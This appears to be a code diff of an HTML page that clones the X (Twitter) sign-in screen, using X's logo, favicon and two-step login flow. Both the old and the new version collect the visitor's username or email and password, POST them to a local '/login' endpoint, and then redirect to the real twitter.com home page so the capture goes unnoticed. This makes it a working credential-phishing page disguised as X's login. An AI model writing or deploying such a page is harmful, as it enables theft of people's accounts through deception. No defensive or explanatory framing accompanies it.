@@ -1,330 +1,267 @@
 <!DOCTYPE html>
-<html lang="en" style="color-scheme: dark;">
+<html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Log in to X / X</title>
-    <link rel="shortcut icon" href="//abs.twimg.com/favicons/twitter.3.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to X / X</title>
+    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
     <style>
-        @font-face {
-            font-family: 'TwitterChirp';
-            src: url('https://abs.twimg.com/fonts/v1/chirp-regular-web.woff2') format('woff2');
-            font-weight: 400;
-            font-style: normal;
-        }
-        @font-face {
-            font-family: 'TwitterChirp';
-            src: url('https://abs.twimg.com/fonts/v1/chirp-bold-web.woff2') format('woff2');
-            font-weight: 700;
-            font-style: normal;
-        }
-        
         body {
-            background-color: #000000;
-            color: #e7e9ea;
-            font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #242d34; /* Dark overlay background */
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
+            height: 100vh;
+            color: #fff;
         }
-        
-        .container {
-            width: 100%;
-            max-width: 600px;
-            padding: 20px;
+        .modal {
+            background-color: #000;
+            width: 600px;
+            height: 650px;
+            border-radius: 16px;
             display: flex;
             flex-direction: column;
             align-items: center;
+            padding: 0 80px;
+            box-sizing: border-box;
+            position: relative;
         }
-        
         .logo {
-            width: 35px;
-            height: 35px;
-            fill: #e7e9ea;
-            margin-bottom: 30px;
+            margin-top: 20px;
+            width: 30px;
+            fill: #fff;
         }
-        
-        .card {
-            width: 100%;
-            max-width: 360px;
-            padding: 0 30px;
-        }
-        
         h1 {
             font-size: 31px;
             font-weight: 700;
-            margin: 0 0 30px 0;
-            line-height: 36px;
+            margin: 30px 0 30px;
+            align-self: flex-start;
+            width: 100%;
+            text-align: left; /* Changed to left/center depending on layout, usually center in modal */
+            text-align: center; 
         }
-        
-        .oauth-btn {
+        .btn-social {
+            width: 300px;
+            height: 40px;
+            border-radius: 20px;
+            background-color: #fff;
+            color: #000;
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 100%;
-            height: 40px;
-            background-color: #fff;
-            color: #0f1419;
-            border: 1px solid #cfd9de;
-            border-radius: 20px;
             font-weight: 700;
             font-size: 15px;
-            margin-bottom: 12px;
+            margin-bottom: 25px;
             cursor: pointer;
-            transition: background-color 0.2s;
+            border: 1px solid #fff;
         }
-        
-        .oauth-btn:hover {
+        .btn-social:hover {
             background-color: #e6e6e6;
         }
-        
-        .oauth-btn.apple {
-            font-weight: 700;
-        }
-        
         .divider {
             display: flex;
             align-items: center;
-            margin: 20px 0;
-            color: #71767b;
+            width: 300px;
+            margin: 0 0 20px;
+            color: #fff;
             font-size: 15px;
-            width: 100%;
         }
-        
         .divider::before, .divider::after {
             content: "";
             flex: 1;
-            border-bottom: 1px solid #2f3336;
+            height: 1px;
+            background-color: #333;
         }
-        
         .divider span {
             padding: 0 10px;
         }
-        
         .input-group {
+            width: 300px;
             position: relative;
-            margin-bottom: 20px;
-            width: 100%;
+            margin-bottom: 25px;
         }
-        
-        .input-field {
+        input {
             width: 100%;
             height: 56px;
-            background-color: #000000;
-            border: 1px solid #333639;
+            background-color: #000;
+            border: 1px solid #333;
             border-radius: 4px;
-            color: #e7e9ea;
+            color: #fff;
+            padding: 20px 10px 0; /* Padding for label */
             font-size: 17px;
-            padding: 25px 10px 8px 10px;
             box-sizing: border-box;
             outline: none;
-            transition: border-color 0.2s;
         }
-        
-        .input-field:focus {
+        input:focus {
             border-color: #1d9bf0;
-            border-width: 2px;
-            padding: 24px 9px 7px 9px; /* Adjust for border width */
         }
-        
         .floating-label {
             position: absolute;
-            top: 18px;
             left: 10px;
-            font-size: 17px;
+            top: 18px;
             color: #71767b;
+            font-size: 17px;
             pointer-events: none;
-            transition: all 0.2s ease-out;
+            transition: 0.2s;
         }
-        
-        .input-field:focus + .floating-label,
-        .input-field:not(:placeholder-shown) + .floating-label {
+        input:focus ~ .floating-label,
+        input:not(:placeholder-shown) ~ .floating-label {
             top: 6px;
             font-size: 13px;
             color: #1d9bf0;
         }
-        
-        .next-btn {
-            width: 100%;
+        .btn-next {
+            width: 300px;
             height: 36px;
-            background-color: #eff3f4;
-            color: #0f1419;
+            border-radius: 18px;
+            background-color: #fff;
+            color: #000;
+            font-weight: 700;
+            font-size: 15px;
             border: none;
-            border-radius: 18px;
-            font-weight: 700;
-            font-size: 15px;
             cursor: pointer;
-            margin-top: 5px;
-            transition: background-color 0.2s;
+            margin-top: 10px;
         }
-        
-        .next-btn:hover {
-            background-color: #d7dbdc;
+        .btn-next:hover {
+            background-color: #e6e6e6;
         }
-        
-        .forgot-password {
-            width: 100%;
-            height: 36px;
-            background-color: #000000;
-            color: #eff3f4;
+        .btn-black {
+            background-color: #000;
+            color: #fff;
             border: 1px solid #536471;
-            border-radius: 18px;
-            font-weight: 700;
-            font-size: 15px;
-            cursor: pointer;
-            margin-top: 24px;
-            transition: background-color 0.2s;
         }
-        
-        .forgot-password:hover {
+        .btn-black:hover {
             background-color: rgba(239, 243, 244, 0.1);
         }
-        
-        .signup-text {
+        .footer-link {
             margin-top: 40px;
             color: #71767b;
             font-size: 15px;
         }
-        
-        .signup-link {
+        .footer-link a {
             color: #1d9bf0;
             text-decoration: none;
         }
-        
-        .signup-link:hover {
-            text-decoration: underline;
-        }
-
-        /* Modal for Password (Hidden initially) */
-        #password-step {
+        .hidden {
             display: none;
+        }
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+            font-family: monospace;
+        }
+        
+        @media (max-width: 600px) {
+            .modal {
+                width: 100%;
+                height: 100%;
+                border-radius: 0;
+                padding: 0 20px;
+                justify-content: center;
+            }
         }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <svg viewBox="0 0 24 24" class="logo" aria-hidden="true">
-        <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
-    </svg>
-    
-    <div class="card" id="username-step">
-        <h1>Sign in to X</h1>
+    <div class="modal">
+        <div class="close-btn">x</div>
+        <svg viewBox="0 0 24 24" class="logo"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
         
-        <button class="oauth-btn" onclick="alert('Google Sign-In simulated')">
-            <svg viewBox="0 0 24 24" width="18" height="18" style="margin-right: 8px;"><g><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"></path><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"></path><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"></path><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"></path></g></svg>
-            Sign in with Google
-        </button>
-        
-        <button class="oauth-btn apple" onclick="alert('Apple Sign-In simulated')">
-            <svg viewBox="0 0 24 24" width="18" height="18" style="margin-right: 8px; fill: black;"><g><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"></path></g></svg>
-            Sign in with Apple
-        </button>
-        
-        <div class="divider">
-            <span>or</span>
-        </div>
-        
-        <div class="input-group">
-            <input type="text" id="username" class="input-field" placeholder=" " autocomplete="username">
-            <label for="username" class="floating-label">Phone, email, or username</label>
-        </div>
-        
-        <button class="next-btn" onclick="showPasswordStep()">Next</button>
-        
-        <button class="forgot-password">Forgot password?</button>
-        
-        <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
-    </div>
-
-    <div class="card" id="password-step">
-        <h1>Enter your password</h1>
-        
-        <div class="input-group" style="background: #e7e9ea; border-radius: 4px; padding: 10px; margin-bottom: 20px; pointer-events: none;">
-            <span style="color: #536471; font-size: 13px;">Username</span>
-            <div style="color: #0f1419; font-size: 17px;" id="display-username">@user</div>
-        </div>
-
-        <form id="login-form" onsubmit="handleLogin(event)">
+        <div id="step-1" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+            <h1>Sign in to X</h1>
+            
+            <div class="btn-social">Sign in with Google</div>
+            <div class="btn-social">Sign in with Apple</div>
+            
+            <div class="divider"><span>or</span></div>
+            
             <div class="input-group">
-                <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password" required>
-                <label for="password" class="floating-label">Password</label>
+                <input type="text" id="email-input" placeholder=" " required>
+                <span class="floating-label">Phone, email, or username</span>
             </div>
             
-            <button type="submit" class="next-btn" style="background-color: #1d9bf0; color: white;">Log in</button>
-        </form>
-        
-        <p class="signup-text" style="margin-top: 20px;">
-            <a href="#" class="signup-link" onclick="showUsernameStep()">Back</a>
-        </p>
+            <button class="btn-next" onclick="goToStep2()">Next</button>
+            <button class="btn-next btn-black" style="margin-top: 20px;">Forgot password?</button>
+            
+            <div class="footer-link">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+
+        <div id="step-2" class="hidden" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+            <h1 style="margin-bottom: 10px;">Enter your password</h1>
+            
+            <div class="input-group" style="background: #202327; border-radius: 4px; padding: 10px; margin-bottom: 30px; width: 300px; box-sizing: border-box;">
+                 <span style="color: #71767b; font-size: 13px;">Email</span><br>
+                 <span id="user-email-display" style="color: #fff; font-size: 15px;">user@example.com</span>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="password-input" placeholder=" " required>
+                <span class="floating-label">Password</span>
+            </div>
+            
+            <button class="btn-next" onclick="submitLogin()">Log in</button>
+            
+            <div class="footer-link">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
     </div>
 
-</div>
-
-<script>
-    let capturedUsername = "";
-
-    function showPasswordStep() {
-        const usernameInput = document.getElementById('username');
-        if (usernameInput.value.trim() === "") {
-            usernameInput.focus();
-            return;
-        }
-        capturedUsername = usernameInput.value;
-        document.getElementById('display-username').textContent = capturedUsername;
-        document.getElementById('username-step').style.display = 'none';
-        document.getElementById('password-step').style.display = 'block';
-        document.getElementById('password').focus();
-    }
-
-    function showUsernameStep() {
-        document.getElementById('password-step').style.display = 'none';
-        document.getElementById('username-step').style.display = 'block';
-    }
-
-    function handleLogin(event) {
-        event.preventDefault();
-        const password = document.getElementById('password').value;
-        
-        const submitBtn = document.querySelector('button[type="submit"]');
-        submitBtn.disabled = true;
-        submitBtn.textContent = "Logging in...";
-
-        fetch('/login', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                username: capturedUsername,
-                password: password,
-                timestamp: new Date().toISOString()
-            })
-        })
-        .then(response => {
-            if (response.redirected) {
-                window.location.href = response.url;
-            } else {
-                window.location.href = "https://twitter.com/home";
+    <script>
+        function goToStep2() {
+            const email = document.getElementById('email-input').value;
+            if (!email) {
+                document.getElementById('email-input').focus();
+                document.getElementById('email-input').style.borderColor = '#d93025'; // Red if empty
+                return;
             }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            window.location.href = "https://twitter.com/home";
-        });
-    }
-
-    // Allow Enter key on username step
-    document.getElementById('username').addEventListener('keypress', function (e) {
-        if (e.key === 'Enter') {
-            showPasswordStep();
+            document.getElementById('user-email-display').innerText = email;
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+            // Re-apply styles to step-2 if needed (it inherits from inline)
+            document.getElementById('step-2').style.display = "flex";
+            document.getElementById('password-input').focus();
         }
-    });
-</script>
 
+        function submitLogin() {
+            const email = document.getElementById('email-input').value;
+            const password = document.getElementById('password-input').value;
+            
+            if (!password) {
+                document.getElementById('password-input').focus();
+                return;
+            }
+
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            }).then(() => {
+                window.location.href = "https://twitter.com/home";
+            });
+        }
+        
+        // Enter key support
+        document.getElementById('email-input').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') goToStep2();
+        });
+        document.getElementById('password-input').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') submitLogin();
+        });
+    </script>
 </body>
 </html>
